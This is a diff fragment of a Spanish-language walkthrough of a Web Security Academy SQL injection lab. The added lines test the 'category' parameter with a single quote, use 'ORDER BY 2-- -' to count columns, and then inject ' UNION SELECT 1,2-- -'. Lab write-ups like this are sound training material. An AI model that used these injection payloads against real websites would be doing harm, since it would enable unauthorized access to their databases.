@@ -21,7 +21,16 @@ https://web-security-academy.net/filter?category=Gifts
 
 **Acción:**
 
-Comprobamos que el parámetro `port_code` es vulnerable inyectando un UNION SELECT.
+
+Comprobamos que el parámetro `Gifts'` es vulnerabl, inyectamos `ORDER BY 2-- -` para saber número de columnas e inyectamos con  `' UNION SELECT 1, 2-- -`.
+
+```sql
+'
+```
+
+```sql
+'ORDER BY 2-- -
+```
 
 ```sql
 ' UNION SELECT 1,2-- -
